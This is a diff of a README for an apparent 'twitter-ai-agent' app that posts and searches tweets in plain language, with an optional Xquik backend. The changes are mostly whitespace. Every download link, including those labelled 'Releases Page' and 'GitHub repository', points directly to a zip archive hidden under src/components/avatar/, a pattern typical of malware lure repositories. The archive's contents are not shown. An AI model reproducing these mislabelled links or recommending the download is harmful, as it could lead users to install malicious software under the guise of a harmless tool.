@@ -3,7 +3,6 @@
 [![Download twitter-ai-agent](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)
 
 ## 📋 Table of Contents
-
 - [💡 Overview](#-overview)
 - [📥 Download & Install](#-download--install)
 - [🛠️ System Requirements](#-system-requirements)
@@ -12,10 +11,10 @@
 - [📞 Contact](#-contact)
 
 ## 💡 Overview
-
 The **twitter-ai-agent** application allows users to interact with Twitter using simple, everyday language. Whether you want to post a tweet, reply to a message, or search for tweets, this application makes it easy. With its straightforward interface and intuitive commands, you'll be tweeting in no time.
 
 ## 📥 Download & Install
+To get started, you need to download the application.
 
 1. Visit this page to download: [Releases Page](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)
 
@@ -30,7 +29,6 @@ The **twitter-ai-agent** application allows users to interact with Twitter using
 6. After installation, you can open the application and start using it to interact with Twitter.
 
 ## 🛠️ System Requirements
-
 To ensure smooth operation of the twitter-ai-agent application, your system should meet the following requirements:
 
 - **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or any Linux distribution released in the last few years.
@@ -39,12 +37,14 @@ To ensure smooth operation of the twitter-ai-agent application, your system shou
 - **Internet Connection:** Required to access Twitter API.
 
 ## ✨ Features
-
 The twitter-ai-agent offers several features to enhance your Twitter experience:
 
 - **Natural Language Processing:** Interact with Twitter using everyday language. No complicated commands are needed.
+
 - **Post and Reply:** Quickly send tweets or reply to messages with just a few simple commands.
+
 - **Search Capability:** Easily find tweets or accounts by using natural language queries.
+
 - **User-Friendly Interface:** An intuitive design makes it easy for anyone to use, regardless of technical experience.
 
 ## Optional Xquik Posting Backend
@@ -60,16 +60,14 @@ XQUIK_ACCOUNT=@your_connected_account
 
 `XQUIK_BASE_URL` is optional and defaults to `https://xquik.com`. See the
 [Xquik create tweet API docs](https://docs.xquik.com/api-reference/x-write/create-tweet)
-for the live request contract.
+for the live request contract. Review every generated post before it is sent.
 
 ## ❓ Support
-
 If you run into any issues or need help, please reach out through the support section on the GitHub page. Common questions and helpful guides can often be found there.
 
 For additional assistance, consider reaching out on forums related to natural language processing or Twitter API usage.
 
 ## 📞 Contact
-
 For feedback or inquiries, contact the project maintainers through the [GitHub repository](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip). Your input helps improve the application.
 
 Thank you for choosing the twitter-ai-agent! Enjoy your tweeting experience with the power of natural language.
